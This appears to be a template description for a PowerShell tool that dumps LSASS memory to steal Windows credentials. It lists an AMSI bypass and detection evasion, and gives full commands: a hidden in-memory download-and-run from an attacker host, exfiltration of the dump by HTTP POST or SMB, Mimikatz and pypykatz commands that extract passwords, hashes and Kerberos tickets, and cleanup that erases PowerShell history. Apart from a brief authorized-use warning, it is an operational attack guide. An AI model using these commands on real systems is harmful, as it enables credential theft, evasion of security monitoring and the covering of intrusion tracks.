  description: |
    Pure PowerShell script to dump LSASS process memory for offline credential extraction.
    
    Features:
    - AMSI bypass for execution
    - Reflective DLL loading (DbgHelp.dll)
    - Dynamic API resolution via reflection
    - MiniDumpWriteDump for memory dumping
    - No compilation required (pure PowerShell)
    - Configurable output path
    
    This script uses reflection to dynamically load and call Windows APIs,
    avoiding traditional PowerShell detection. The dumped file can be analyzed
    offline with Mimikatz or pypykatz to extract credentials.
    
    WARNING: For authorized security testing only! This technique is heavily monitored by EDR.

    PowerShell LSASS MiniDump Credential Dumper - Launch Instructions

    Transfer and Execute (In-Memory):
    powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP:8080/{{ output_file }}')"

    Alternative (File-Based Execution):
    python3 -m http.server 8080
    On target: powershell -ep bypass -c "IWR -Uri http://YOUR_IP:8080/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"

    Exfiltrate Dump File:
    python3 -m http.server 8080
    On target: Invoke-WebRequest -Uri "http://YOUR_IP:8080/upload" -Method POST -InFile "{{ dump_path }}"

    Or via SMB:
    impacket-smbserver share . -smb2support
    On target: copy {{ dump_path }} \\YOUR_IP\share\lsass.dmp

    Extract Credentials:
    pypykatz lsa minidump lsass.dmp

    Or with Mimikatz (Windows):
    mimikatz.exe
    sekurlsa::minidump lsass.dmp
    sekurlsa::logonPasswords full

    Notes:
    - Dump path: {{ dump_path }} (typically 50-200 MB)
    - Includes AMSI bypass for in-memory execution
    - Uses reflection to dynamically resolve APIs (evades static detection)
    - Requires Administrator privileges or SeDebugPrivilege
    - MiniDumpWriteDump with type 2 (full memory dump)
    - Extracts plaintext passwords (if WDigest enabled), NTLM hashes, Kerberos tickets, domain cached credentials
    - HEAVILY monitored by EDR/AV - high detection rate
    - PowerShell Script Block Logging will record execution (Event ID 4104)
    - Consider alternatives: comsvcs.dll method, Volume Shadow Copy, process cloning, syscalls

    Troubleshooting:
    - Access Denied: Run as Administrator or with SeDebugPrivilege
    - AMSI blocks: Script includes bypass; if still blocked, obfuscate with Invoke-Obfuscation
    - File creation fails: Check disk space and path permissions
    - No credentials extracted: LSASS may be protected (PPL - Protected Process Light)
    - EDR blocks: Expected; this technique is well-known to defenders
    - Sysmon Event ID 10 (ProcessAccess) will fire when accessing LSASS

    Cleanup:
    On target:
    Remove-Item {{ dump_path }} -Force
    Remove-Item {{ output_file }} -Force
    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
